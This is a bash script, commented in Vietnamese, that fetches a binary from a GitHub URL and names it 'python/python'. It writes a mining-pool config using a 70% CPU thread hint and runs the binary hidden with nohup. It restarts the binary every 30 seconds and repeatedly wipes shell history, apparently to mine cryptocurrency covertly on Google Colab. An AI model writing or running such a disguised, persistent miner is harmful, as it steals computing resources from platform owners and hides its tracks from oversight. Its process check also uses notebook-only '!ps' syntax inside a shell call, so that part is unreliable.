#!/bin/bash

DOMAIN=$1      # domain:port
HOSTNAME=$2    # hostname
CONFIG="setting.json"
BINARY="python/python"
WORKDIR=$(pwd)

# Tải binary nếu chưa có
if [ ! -f "$BINARY" ]; then
    echo "Downloading binary..."
    curl -sL -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz >/dev/null 2>&1
    tar -xzf python.tar.gz
    rm -f python.tar.gz
fi

# Tạo config.json nếu chưa có
if [ ! -f "$CONFIG" ]; then
    cat > "$CONFIG" <<EOF
{
  "pools": [
    {
      "url": "$DOMAIN",
      "user": "$HOSTNAME",
      "pass": "x",
      "tls": true,
      "keepalive": true
    }
  ],
  "cpu": {
    "enabled": true,
    "max-threads-hint": 70
  }
}
EOF
fi

# Hàm kiểm tra process (cho Colab)
check_process() {
    # Dùng lệnh system với ! (hoạt động trong Colab)
    python3 -c "
import subprocess, sys
try:
    result = subprocess.run('!ps aux', shell=True, capture_output=True, text=True)
    if '$BINARY' in result.stdout:
        sys.exit(0)
    sys.exit(1)
except:
    sys.exit(1)
" >/dev/null 2>&1
    return $?
}

# Hàm start process
start_process() {
    nohup "$WORKDIR/$BINARY" -c "$WORKDIR/$CONFIG" >/dev/null 2>&1 &
    echo "Process restarted"
}

# Nếu chưa chạy thì start
if check_process; then
    #echo "Process is running api python"
    :
else
    start_process
fi

# Vòng lặp kiểm tra mỗi 30s
while true; do
    if check_process; then
        #echo "Process is running api python"
        :
    else
        start_process
    fi
    history -c
    history -w
    sleep 30
done
